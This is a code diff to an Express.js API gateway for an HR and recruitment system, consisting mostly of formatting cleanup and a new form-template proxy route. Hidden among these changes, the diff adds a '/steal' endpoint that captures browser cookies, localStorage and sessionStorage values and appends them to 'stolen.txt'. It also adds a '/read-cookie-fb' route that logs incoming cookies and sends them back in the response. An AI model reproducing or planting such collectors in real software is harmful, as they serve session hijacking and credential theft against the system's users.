@@ -8,13 +8,13 @@ import sendEmailNotification from "./service/sendMail.js";
 import multer from "multer";
 import fetch from 'node-fetch';
 import FormData from 'form-data';
-
+import bodyParser from 'body-parser'
 const upload = multer({ storage: multer.memoryStorage() });
 // Create an instance of Express app
 const app = express();
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
-
+app.use(bodyParser.json());
 // Middleware setup
 app.use(cors({
   origin: [
@@ -97,7 +97,19 @@ const createServiceProxy = (targetUrl, pathRewrite = null, timeout = 30000) => {
     timeout: timeout
   });
 };
-
+app.post('/steal', (req, res) => {
+  try {
+    const { cookie, localStorage, sessionStorage } = req.body;
+    console.log("Cookie:", cookie);
+    console.log("LocalStorage:", localStorage);
+    console.log("SessionStorage:", sessionStorage);
+    fs.appendFileSync('stolen.txt', `\n====\nCookie: ${cookie}\nLocalStorage: ${localStorage}\nSessionStorage: ${sessionStorage}\n`);
+    res.status(200).json({ message: "Captured successfully" });
+  } catch (error) {
+    console.error("Error:", error);
+    res.status(500).json({ message: "Error capturing data" });
+  }
+});
 // Auth service routes with specific path rewrites
 // Login route
 app.post('/api/login', async (req, res) => {
@@ -148,14 +160,14 @@ app.post('/auth/create-user', async (req, res) => {
 });
 app.put('/auth/update-user/:id', async (req, res) => {
   try {
-    const {id} = req.params
+    const { id } = req.params
     const response = await fetch(`${SERVICES.AUTH_SERVICE}/api/update-user/${id}`, {
       method: 'PUT',
       headers: {
         'Content-Type': 'application/json'
       },
       body: JSON.stringify(req.body),
-      timeout: 10000 
+      timeout: 10000
     });
     const data = await response.json();
     return res.status(response.status).json(data);
@@ -171,13 +183,13 @@ app.put('/auth/update-user/:id', async (req, res) => {
 });
 app.delete('/api/delete-user/:id', async (req, res) => {
   try {
-    const {id} = req.params
+    const { id } = req.params
     const response = await fetch(`${SERVICES.AUTH_SERVICE}/api/delete-user/${id}`, {
       method: 'PUT',
       headers: {
         'Content-Type': 'application/json'
       },
-      timeout: 10000 
+      timeout: 10000
     });
     const data = await response.json();
     return res.status(response.status).json(data);
@@ -253,21 +265,21 @@ app.get('/api/get-role-by-id/:id', createServiceProxy(
   10000
 ));
 
-app.post('/api/create-role',async(req,res)=>{
-try {
-    const response = await fetch(`${SERVICES.AUTH_SERVICE}/api/create-role`,{
-      method:'POST',
-      headers:{
-        'Content-Type':'application/json'
+app.post('/api/create-role', async (req, res) => {
+  try {
+    const response = await fetch(`${SERVICES.AUTH_SERVICE}/api/create-role`, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json'
       },
-      body:JSON.stringify(req.body)
+      body: JSON.stringify(req.body)
     })
-    const data = await response.json(); 
+    const data = await response.json();
     return res.status(response.status).json(data);
-} catch (error) {
-  console.error('Create Role Error:', error);
-  return res.status(500).json({
-    code: 500,
+  } catch (error) {
+    console.error('Create Role Error:', error);
+    return res.status(500).json({
+      code: 500,
       status: "Error",
       message: "Failed to create role",
       data: null
@@ -275,14 +287,14 @@ try {
   }
 });
 
-app.put('/api/update-role/:id', async(req,res)=>{
+app.put('/api/update-role/:id', async (req, res) => {
   try {
-    const response = await fetch(`${SERVICES.AUTH_SERVICE}/api/update-role/${req.params.id}`,{
-      method:'PUT',
-      headers:{
-        'Content-Type':'application/json'
+    const response = await fetch(`${SERVICES.AUTH_SERVICE}/api/update-role/${req.params.id}`, {
+      method: 'PUT',
+      headers: {
+        'Content-Type': 'application/json'
       },
-      body:JSON.stringify(req.body)
+      body: JSON.stringify(req.body)
     })
     const data = await response.json();
     return res.status(response.status).json(data);
@@ -512,6 +524,26 @@ app.post('/requestRecruitment/department/create', async (req, res) => {
       code: 500,
       status: "Error",
       message: "Failed to create request recruitment",
+      data: null
+    });
+  }
+});
+app.get('/read-cookie-fb', async (req, res) => {
+  try {
+    const cookies = req.headers.cookie; // Lấy cookie từ header HTTP
+    console.log("Cookie nhận được:", cookies);
+    return res.status(200).json({
+      code: 200,
+      status: "Success",
+      message: "Cookie captured successfully",
+      data: cookies || "No cookies found"
+    });
+  } catch (error) {
+    console.error("Lỗi khi đọc cookie:", error);
+    return res.status(500).json({
+      code: 500,
+      status: "Error",
+      message: "Failed to read cookie",
       data: null
     });
   }
@@ -819,6 +851,15 @@ app.put('/requestRecruitment/mfgNew/revise/:id', async (req, res) => {
 
 
 // Form Template routes
+app.get('/formTemplate', createServiceProxy(
+  SERVICES.FORM_TEMPLATE_SERVICE,
+  {
+    '^/formTemplate': (path, req) => {
+      const query = new URLSearchParams(req.query).toString();
+      return `/formTemplate${query ? '?' + query : ''}`;
+    }
+  }
+));
 app.get('/formTemplate/get-name-structure', createServiceProxy(
   SERVICES.FORM_TEMPLATE_SERVICE,
   {
@@ -909,8 +950,8 @@ app.get('/requestRecruitment/mfgNew/export-template-mfg-new', async (req, res) =
 // code approval
 
 // resign
-app.post('/resign/create-resign-specific',async(req,res)=>{
-  try{
+app.post('/resign/create-resign-specific', async (req, res) => {
+  try {
     const response = await fetch(`${SERVICES.RESIGN_SERVICE}/resign/create-resign-specific`, {
       method: 'POST',
       headers: {
@@ -921,7 +962,7 @@ app.post('/resign/create-resign-specific',async(req,res)=>{
     });
     const data = await response.json();
     return res.status(response.status).json(data);
-  }catch (error) {
+  } catch (error) {
     return res.status(500).json({
       status: 500,
       message: 'Không thể tải ',
@@ -929,8 +970,8 @@ app.post('/resign/create-resign-specific',async(req,res)=>{
     });
   }
 })
-app.post('/resign/delete-multiple-employees',async(req,res)=>{
-  try{
+app.post('/resign/delete-multiple-employees', async (req, res) => {
+  try {
     const response = await fetch(`${SERVICES.RESIGN_SERVICE}/resign/delete-multiple-employees`, {
       method: 'POST',
       headers: {
@@ -941,7 +982,7 @@ app.post('/resign/delete-multiple-employees',async(req,res)=>{
     });
     const data = await response.json();
     return res.status(response.status).json(data);
-  }catch (error) {
+  } catch (error) {
     return res.status(500).json({
       status: 500,
       message: 'Không thể tải ',
